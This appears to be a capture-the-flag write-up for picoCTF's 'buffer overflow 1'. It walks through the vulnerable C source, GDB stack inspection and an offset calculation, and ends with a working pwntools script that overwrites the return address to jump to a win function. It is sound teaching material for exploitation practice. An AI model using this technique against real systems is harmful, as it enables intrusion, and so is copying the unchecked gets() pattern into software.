# picoCTF buffer overflow 1

This is the 'buffer overflow 1' level from picoCTF. It can be found here, along with the binary source code.

Let's take a look at the code first:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

So we have the 'main' function that just basically calls 'vuln'. Inside that function, we have a `buf` variable with a size of 32 bytes, and then it calls `gets`, and stores it on this 'buf' variable. 

As we saw in the previous challenge, this functions is insecure due to the lack of size validation before saving it to a variable. 

Anyways, aftet saving out input, it will print the return address where the program will jump. 
The 'win' function seems like a promising target to jump. 

Let's run this in GDB and see what we can do. I'll put a breakpoint right after the 'gets' call. 

```
gdb ./vuln
gef➤ b *vuln+34
gef➤r
```

Here we can see where we at when hits the breakpoint, and in the next instruction, we'll inspect the stack and the return address as well. 

```
    0x804929e <vuln+001d>      call   0x8049050 <gets@plt>
 →  0x80492a3 <vuln+0022>      add    esp, 0x10
```

and here's the stack at this point:
```
gef➤  x/20wx $esp
0xffffceb0:     0xffffcec0      0x000007d4      0xf7fa0e3c      0x08049291
0xffffcec0:     0x41414141      0xf7fd9000      0x00000000      0x0804c000
0xffffced0:     0xffffcfd4      0xf7ffcb80      0xffffcf08      0x08049327
0xffffcee0:     0x0804a0a0      0x0804c000      0xffffcf08      0x0804932f
0xffffcef0:     0xffffcf30      0xf7fbe66c      0xf7fbeb10      0x000003e8
gef➤
```

We see our input starts at `0xffffcec0` because there are 4 'A' ('A' in hex is 0x41).

If we place a new breakpoint inside the 'vuln' function but at the `ret` instruction, we can see where is the program jumping. 
```
gef➤ b *vuln+66
get➤ continue
```
and we can see it's going back to '0x804932f':
```
 →  0x80492c3 <vuln+0042>      ret
   ↳   0x804932f <main+006b>      mov    eax, 0x0
       0x8049334 <main+0070>      lea    esp, [ebp-0x8]
       [...]
```
So, from the information we got from inspecting the stack, we see that address is stored at '0xffffceec'

Calulating the offset from our input: 
`0xffffceec - 0xffffcec0 = 0x2c` which is 44 bytes. 

So, 44 bytes from our input, we will start overwriting the return address. Let's input `44 * 'A' + 4 * 'B'` to see if the program attempts to jump into '0x42424242'.

```
mfumega@pwn-boy:/tmp/here$ ./vuln
Please enter your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Okay, time to return... Fingers Crossed... Jumping to 0x42424242
Segmentation fault (core dumped)
```

It worked. So, if we replace the 4 'B' with our 'win' function address, we should continue the execution at that point, and succesfully printing the flag!

Let's find that address first: 
```
gef➤  print win
$2 = {<text variable, no debug info>} 0x80491f6 <win>
```

and now let's build the exploit with pwntools, just to start familiarizing with it.
```python
#!/usr/bin/env python3
from pwn import *
p = process('./vuln')

win_address = 0x80491f6
offset = 44

payload = b'A' * offset
payload += p32(win_address)

p.sendline(payload)
response = p.recvall()
print(response.decode('latin-1'))
```
Make it executable, run it and got the flag. 
```
mfumega@pwn-boy:/tmp/here$ ./do1.py
[+] Starting local process './vuln': pid 287169
[+] Receiving all data: Done (117B)
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 287169)
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
mock{This_is_a_mock_flag}
```

And we got the local flag. To execute the same code against a remote server, replace the line `p=process(binary_name)` with `p = remote('host', port)`. 
